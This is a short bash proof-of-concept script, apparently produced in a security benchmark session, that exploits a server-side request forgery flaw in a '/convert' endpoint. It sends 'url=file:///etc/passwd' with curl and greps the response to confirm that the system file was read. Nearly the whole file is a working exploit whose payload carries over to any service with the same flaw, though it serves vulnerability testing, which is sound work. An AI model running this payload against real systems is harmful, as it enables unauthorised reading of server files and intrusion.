#!/bin/bash
# POC: SSRF vulnerability via file:// protocol to read arbitrary files from server filesystem
# Target: ./repo
# Created: 2025-11-04T20:05:29.338Z
# Session: benchmark-XBEN-033-24-mhkzvt57

# SSRF Vulnerability POC: Arbitrary File Read via file:// Protocol
# Target: /convert endpoint
# Vulnerability: Server-Side Request Forgery (SSRF) allowing arbitrary file read

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "============================================"
echo "SSRF File Protocol Arbitrary Read POC"
echo "============================================"
echo "Target: ${TARGET_URL}/convert"
echo ""

# Test 1: Read /etc/passwd via file:// protocol
echo "[*] Test 1: Attempting to read /etc/passwd via file:// protocol"
echo "[*] Payload: url=file:///etc/passwd"
echo ""

RESPONSE=$(curl -s -X POST "${TARGET_URL}/convert" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=file:///etc/passwd")

# Check if response contains passwd file content
if echo "$RESPONSE" | grep -q "root:.*:0:0:"; then
    echo "[+] SUCCESS: /etc/passwd content retrieved!"
    echo "[+] Response contains passwd entries:"
    echo "$RESPONSE" | grep -E "root:|daemon:|bin:" | head -3
    echo ""
    echo "[+] Full Response (first 500 chars):"
    echo "$RESPONSE" | head -c 500
    echo ""
    echo ""
    echo "[✓] SSRF Vulnerability CONFIRMED"
    exit 0
elif echo "$RESPONSE" | grep -qi "error\|forbidden\|not allowed"; then
    echo "[-] SSRF protection detected: $RESPONSE"
    exit 1
else
    echo "[-] Unexpected response. Full response:"
    echo "$RESPONSE"
    exit 1
fi